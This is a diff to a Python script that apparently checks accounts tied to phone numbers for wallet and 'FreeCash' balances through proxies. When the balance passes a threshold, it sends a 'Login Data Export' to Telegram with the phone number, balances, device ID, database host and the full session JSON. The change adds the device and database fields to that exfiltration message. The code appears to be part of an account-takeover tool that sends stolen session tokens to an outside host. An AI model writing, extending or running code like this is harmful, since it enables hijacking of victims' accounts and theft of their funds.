@@ -478,12 +478,14 @@ def process_single_number(phone, fb_url, device_id, instance_id, proxies=None):
         
         if total_bal >= min_amount:
             session_json_str = json.dumps(session_data, indent=2)
+            fb_short = fb_url.split("//")[1].split("/")[0] if "//" in fb_url else fb_url
             tg_msg = (
                 f"💰 <b>Login Data Export</b>\n\n"
                 f"📱 <b>Mobile:</b> {phone}\n"
-                f"🔑 <b>Member ID:</b> {m_id}\n"
                 f"👛 <b>Wallet:</b> Rs{wallet_bal}\n"
-                f"🎁 <b>FreeCash:</b> Rs{freecash_bal}\n\n"
+                f"🎁 <b>FreeCash:</b> Rs{freecash_bal}\n"
+                f"📟 <b>Device:</b> <code>{device_id}</code>\n"
+                f"🔥 <b>DB:</b> {fb_short}\n\n"
                 f"<pre><code class=\"language-json\">{session_json_str}</code></pre>"
             )
             send_telegram_alert(tg_msg)
